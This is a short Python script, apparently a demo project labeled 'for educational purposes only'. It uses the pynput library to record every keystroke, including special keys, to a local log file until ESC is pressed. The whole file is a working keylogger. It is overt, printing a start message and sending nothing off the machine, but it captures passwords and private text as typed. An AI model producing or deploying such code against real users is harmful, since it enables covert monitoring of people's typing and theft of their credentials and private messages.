# This project is created for educational purposes only

from pynput import keyboard

# File to store logs
log_file = "log.txt"

# Create file initially
with open(log_file, "w") as f:
    f.write("Start Log:\n")

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    # Stop when ESC is pressed
    if key == keyboard.Key.esc:
        print("\nStopped logging.")
        return False

print("Keylogger started... Press ESC to stop.")

# Start listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
